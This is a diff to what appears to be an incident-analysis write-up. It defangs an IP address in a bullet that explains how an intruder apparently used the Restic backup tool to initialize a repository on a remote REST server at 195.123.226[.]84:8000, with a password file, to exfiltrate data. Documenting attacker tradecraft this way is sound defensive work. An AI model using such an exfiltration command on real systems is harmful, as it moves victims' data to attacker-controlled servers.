@@ -24,7 +24,7 @@ restic.exe -r rest:http://195.123.226[.]84:8000/ init --password-file ppp.txt
 ```
 
 - **restic.exe**: The Restic binary used for the backup operation.
-- **-r rest:http://195.123.226.84:8000/**: This specifies the backup repository location. The backup data was sent over HTTP to a remote server (`195.123.226[.]84`) running a REST service on port 8000.
+- **-r rest:http://195.123.226[.]84:8000/**: This specifies the backup repository location. The backup data was sent over HTTP to a remote server (`195.123.226[.]84`) running a REST service on port 8000.
 - **init**: Initializes a new backup repository at the specified location.
 - **--password-file ppp.txt**: The `ppp.txt` file contains the password for accessing the repository. This password file is required to encrypt/decrypt the backup data.
 
